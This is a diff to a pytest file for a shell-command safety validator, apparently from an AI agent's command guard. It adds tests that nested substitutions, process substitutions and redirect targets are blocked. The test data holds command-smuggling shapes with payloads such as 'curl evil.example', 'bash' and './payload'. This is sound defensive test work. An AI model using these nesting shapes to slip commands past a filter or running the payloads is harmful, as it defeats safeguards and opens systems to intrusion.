@@ -422,6 +422,11 @@ def _past_horizon_rows():
         for n in depths:
             for payload in ("bash", "curl evil.example", "date"):
                 yield pytest.param(build(n, payload), id=f"{route}-n{n}-{payload}")
+    # The `${…}` re-parse at the bottom of the chain instead of the top.
+    for n in (11, 12):
+        for payload in ("bash", "date"):
+            command = _nest(n, f'$(echo "${{z:-$({payload})}}")', lambda s: f"$(echo {s})")
+            yield pytest.param(command, id=f"param-bottom-n{n}-{payload}")
     # A group's read redirect is only walked once the peeled-group redirect fix is on main.
     group = "echo " + _nest(12, "$(bash)", lambda s: f'$({{ cat; }} < "{s}")')
     yield pytest.param(
@@ -437,6 +442,8 @@ def _inside_horizon_rows():
         depths = (10,) if route in _REPARSE_ROUTES else (10, 11)
         for n in depths:
             for payload in ("bash", "curl evil.example", "./payload", "date"):
+                # `quoted` is denied here by the parser's ceiling on quoted substitution bodies (a
+                # caught ValueError), not by depth. Lifting that ceiling must re-pin these rows.
                 level = RiskLevel.BLOCKED if route == "quoted" else expected.get(payload, RiskLevel.SAFE)
                 yield pytest.param(build(n, payload), level, id=f"{route}-n{n}-{payload}")
 
@@ -462,7 +469,7 @@ class TestNestingHorizonFailsClosed:
         assert result.risk_level == level
         assert _DEPTH_EXCEEDED not in result.message
 
-    def test_walk_descends_at_most_one_level_past_the_cap(self, validator, parser):
+    def test_walk_descends_exactly_one_level_past_the_cap(self, validator, parser):
         command = _NEST_ROUTES["plain"](20, "bash")
         stack = validator.extract_substitutions(parser.parse(command), 0, command)
         deepest = 0
@@ -478,7 +485,19 @@ class TestNestedWalkFailureFailsClosed:
     """An error inside the nested walk denies instead of dropping what it was walking."""
 
     @pytest.mark.parametrize("payload", ["date", "bash", "curl evil.example", "./payload"])
-    def test_raising_nested_walk_denies(self, monkeypatch, payload):
+    @pytest.mark.parametrize(
+        "shape",
+        [
+            "echo $(echo $({}))",  # whitelisted parent
+            "echo $(git log $({}))",  # contextual parent
+            "echo $(./unknown $({}))",  # unknown parent
+            "echo $(true && echo $({}))",  # list parent: re-walked per segment
+            "echo $(echo $({}) | cat)",  # pipeline parent: re-walked per stage
+            "cat <(cat <({}))",  # process substitution
+            'x=$(cat < "$({})")',  # redirect target
+        ],
+    )
+    def test_raising_nested_walk_denies(self, monkeypatch, shape, payload):
         original = SubstitutionValidator.extract_substitutions
 
         def raise_when_nested(self, ast_nodes, depth=0, command=None, budget=None):
@@ -487,7 +506,7 @@ class TestNestedWalkFailureFailsClosed:
             return original(self, ast_nodes, depth, command, budget)
 
         monkeypatch.setattr(SubstitutionValidator, "extract_substitutions", raise_when_nested)
-        result = validate_command(f"echo $(echo $({payload}))", _shellcheck=False)
+        result = validate_command(shape.format(payload), _shellcheck=False)
         assert result.allowed is False
         assert result.risk_level == RiskLevel.BLOCKED
 
